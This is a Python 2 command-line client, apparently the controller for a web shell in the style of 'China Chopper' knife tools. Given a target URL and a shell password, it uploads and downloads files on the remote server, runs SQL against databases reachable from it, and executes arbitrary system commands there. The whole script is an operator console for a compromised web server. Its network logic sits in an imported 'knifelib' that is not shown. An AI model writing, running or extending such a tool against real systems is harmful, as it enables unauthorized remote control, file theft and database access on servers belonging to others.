#!/usr/bin/python
from knifelib import FileManage,Syscmd,DbManage
import sys,os
import re
#author:xbillow


helpstr='''
get <remotePath>                    download file from remotePath to current directory.
put <localPath> <remotePath>        uploag file from localPath to remotePath.
sql <host> <user> <passwd> [port]   connect the database by the server.
help                                show this page.
<any other system command>          execute the command.
'''
def main(url,passwd):
    print helpstr
    cmd=raw_input("xniffe->>")
    while cmd!='exit':
        argvs=re.split(' +',cmd)
        if cmd=='help':
            print helpstr
        elif argvs[0]=='':
            cmd=raw_input("xniffe->>")
            continue
        elif argvs[0]=='put':
            if len(argvs)==3:
                FileManage(url,passwd).upload(argvs[1],argvs[2])
            else:
                print "[-]Error:argument too many or too few."
                cmd='help'
                continue
        elif argvs[0]=='get':
            if len(argvs)==2:
                FileManage(url,passwd).download(argvs[1])
            else:
                print "[-]Error:argument too many or too few."
                cmd='help'
                continue
        elif argvs[0]=='sql':
            conn=DbManage(url,passwd)
            if len(argvs)==4:
                conn.connect(argvs[1],argvs[2],argvs[3])
            elif len(argvs)==5:
                conn.connect(argvs[1],argvs[2],argvs[3],argvs[4])
            else:
                print "[-]Error:argument too many or too few."
                cmd='help'
                continue
            print("You can execute sql now.")
            cmd=raw_input("xniffe-sql>>")
            while cmd!='exit':
                argvs=re.split(' +',cmd)
                if argvs[0]=='use':
                    conn.changeDb(argvs[1])
                elif argvs[0]=='':
                    cmd=raw_input("xniffe-sql>>")
                    continue
                else:
                    conn.execute(cmd)
                cmd=raw_input("xniffe-sql>>")   
        elif argvs[0]=='clear':
            if os.path.exists('/bin'):
                os.system('clear')
            else:
                os.system('cls') 
        else:
            Syscmd(url,passwd).system(cmd)
        cmd=raw_input("xniffe->>")
if __name__=='__main__':
    if len(sys.argv)!=3:
        print "useage: {} <url> <password>".format(sys.argv[0])
    else:
        url=sys.argv[1]
        passwd=sys.argv[2]
        main(url,passwd)